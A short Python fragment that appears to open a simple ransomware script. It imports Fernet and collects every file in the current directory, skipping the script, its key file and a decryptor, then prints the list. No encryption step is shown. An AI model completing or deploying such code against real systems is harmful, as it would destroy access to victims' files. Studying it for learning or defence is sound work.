import os
from cryptography.fernet import Fernet


#let's find some files
files = []
for file in os.listdir():
        if file == "ransome.py" or file == "thekey.key" or file == "decrypt.py":
                continue
        if os.path.isfile(file):
                files.append(file)
print(files)
